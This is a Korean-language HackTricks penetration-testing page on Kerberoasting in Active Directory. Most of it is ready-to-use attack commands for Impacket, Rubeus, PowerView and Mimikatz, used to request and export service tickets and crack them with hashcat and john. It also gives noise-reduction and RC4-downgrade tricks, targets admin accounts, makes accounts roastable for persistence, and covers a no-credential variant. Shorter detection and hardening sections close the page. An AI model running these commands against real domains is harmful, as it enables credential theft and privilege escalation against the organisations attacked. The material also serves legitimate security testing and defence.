# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting은 Active Directory (AD)에서 사용자 계정으로 운영되는 서비스와 관련된 TGS 티켓의 획득에 중점을 둡니다. 컴퓨터 계정은 제외됩니다. 이러한 티켓의 암호화는 사용자 비밀번호에서 유래한 키를 사용하여 이루어지며, 오프라인 자격 증명 크래킹이 가능합니다. 사용자 계정을 서비스로 사용하는 경우는 비어 있지 않은 ServicePrincipalName (SPN) 속성으로 표시됩니다.

인증된 도메인 사용자는 누구나 TGS 티켓을 요청할 수 있으므로 특별한 권한이 필요하지 않습니다.

### Key Points

- 사용자 계정(즉, SPN이 설정된 계정; 컴퓨터 계정 아님)으로 실행되는 서비스의 TGS 티켓을 대상으로 합니다.
- 티켓은 서비스 계정의 비밀번호에서 파생된 키로 암호화되며 오프라인에서 크래킹할 수 있습니다.
- 권한 상승이 필요하지 않으며, 인증된 계정은 누구나 TGS 티켓을 요청할 수 있습니다.

> [!WARNING]
> 대부분의 공개 도구는 RC4-HMAC (etype 23) 서비스 티켓 요청을 선호합니다. 이는 AES보다 크래킹 속도가 빠르기 때문입니다. RC4 TGS 해시는 `$krb5tgs$23$*`로 시작하고, AES128은 `$krb5tgs$17$*`, AES256은 `$krb5tgs$18$*`로 시작합니다. 그러나 많은 환경이 AES 전용으로 이동하고 있습니다. RC4만 관련이 있다고 가정하지 마십시오.
> 또한 "spray-and-pray" 로스팅을 피하십시오. Rubeus의 기본 kerberoast는 모든 SPN에 대해 티켓을 쿼리하고 요청할 수 있으며 소음이 발생합니다. 먼저 흥미로운 주체를 열거하고 타겟팅하십시오.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
다양한 기능을 포함한 도구들, kerberoast 체크:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoastable 사용자 열거
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS 요청 및 메모리에서 덤프하기
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 기법 2: 자동화 도구
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS 요청은 Windows 보안 이벤트 4769(서비스 티켓이 요청되었습니다)를 생성합니다.

### OPSEC 및 AES 전용 환경

- AES가 없는 계정에 대해 의도적으로 RC4 요청:
- Rubeus: `/rc4opsec`는 tgtdeleg를 사용하여 AES가 없는 계정을 열거하고 RC4 서비스 티켓을 요청합니다.
- Rubeus: `/tgtdeleg`와 kerberoast는 가능한 경우 RC4 요청도 트리거합니다.
- 조용히 실패하는 대신 AES 전용 계정을 로스트:
- Rubeus: `/aes`는 AES가 활성화된 계정을 열거하고 AES 서비스 티켓(etype 17/18)을 요청합니다.
- 이미 TGT(PTT 또는 .kirbi에서)를 보유하고 있는 경우 `/ticket:<blob|path>`를 `/spn:<SPN>` 또는 `/spns:<file>`와 함께 사용하여 LDAP을 건너뛸 수 있습니다.
- 타겟팅, 스로틀링 및 소음 감소:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` 및 `/jitter:<1-100>`을 사용합니다.
- `/pwdsetbefore:<MM-dd-yyyy>`(이전 비밀번호)를 사용하여 약한 비밀번호를 필터링하거나 `/ou:<DN>`으로 특권 OU를 타겟팅합니다.

예시 (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### 크래킹
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

계정을 제어하거나 수정할 수 있는 경우, SPN을 추가하여 kerberoastable하게 만들 수 있습니다:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
계정을 다운그레이드하여 더 쉽게 크랙할 수 있도록 RC4를 활성화합니다(대상 객체에 대한 쓰기 권한 필요):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
유용한 kerberoast 공격 도구는 여기에서 찾을 수 있습니다: https://github.com/nidem/kerberoast

Linux에서 다음과 같은 오류가 발생하면: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` 이는 로컬 시간 차이 때문입니다. DC에 동기화하세요:

- `ntpdate <DC_IP>` (일부 배포판에서 사용 중단됨)
- `rdate -n <DC_IP>`

### 탐지

Kerberoasting은 은밀할 수 있습니다. DC에서 이벤트 ID 4769를 검색하고 필터를 적용하여 노이즈를 줄이세요:

- 서비스 이름 `krbtgt` 및 `$`로 끝나는 서비스 이름(컴퓨터 계정)을 제외합니다.
- 머신 계정(`*$$@*`)의 요청을 제외합니다.
- 성공적인 요청만 (실패 코드 `0x0`).
- 암호화 유형 추적: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). `0x17`에만 경고하지 마세요.

예시 PowerShell 분류:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
추가 아이디어:

- 호스트/사용자별로 정상 SPN 사용 기준선을 설정하고, 단일 주체에서 발생하는 다양한 SPN 요청의 대량 발생에 대해 경고합니다.
- AES 강화 도메인에서 비정상적인 RC4 사용을 플래그합니다.

### 완화 / 강화

- 서비스에 gMSA/dMSA 또는 머신 계정을 사용합니다. 관리 계정은 120자 이상의 무작위 비밀번호를 가지고 있으며 자동으로 회전하여 오프라인 크래킹을 비현실적으로 만듭니다.
- `msDS-SupportedEncryptionTypes`를 AES 전용(10진수 24 / 16진수 0x18)으로 설정하여 서비스 계정에서 AES를 강제하고, 그 후 비밀번호를 회전시켜 AES 키가 파생되도록 합니다.
- 가능한 경우 환경에서 RC4를 비활성화하고 RC4 사용 시도를 모니터링합니다. DC에서는 `DefaultDomainSupportedEncTypes` 레지스트리 값을 사용하여 `msDS-SupportedEncryptionTypes`가 설정되지 않은 계정의 기본값을 조정할 수 있습니다. 철저히 테스트합니다.
- 사용자 계정에서 불필요한 SPN을 제거합니다.
- 관리 계정이 불가능한 경우 긴 무작위 서비스 계정 비밀번호(25자 이상)를 사용하고, 일반 비밀번호를 금지하며 정기적으로 감사합니다.

### 도메인 계정 없이 Kerberoast (AS 요청 ST)

2022년 9월, Charlie Clark는 주체가 사전 인증을 요구하지 않는 경우, 요청 본문의 sname을 변경하여 KRB_AS_REQ를 조작함으로써 서비스 티켓을 얻을 수 있음을 보여주었습니다. 이는 TGT 대신 서비스 티켓을 얻는 것으로 AS-REP 로스팅과 유사하며 유효한 도메인 자격 증명이 필요하지 않습니다.

자세한 내용: Semperis 작성 “새로운 공격 경로: AS 요청 ST”.

> [!WARNING]
> 유효한 자격 증명이 없으면 이 기술로 LDAP를 쿼리할 수 없으므로 사용자 목록을 제공해야 합니다.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
관련

AS-REP 로스팅 가능한 사용자를 타겟팅하는 경우, 다음도 참조하십시오:

{{#ref}}
asreproast.md
{{#endref}}

## 참고 문헌

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Microsoft의 Kerberoasting 완화를 위한 가이드: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting 문서: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
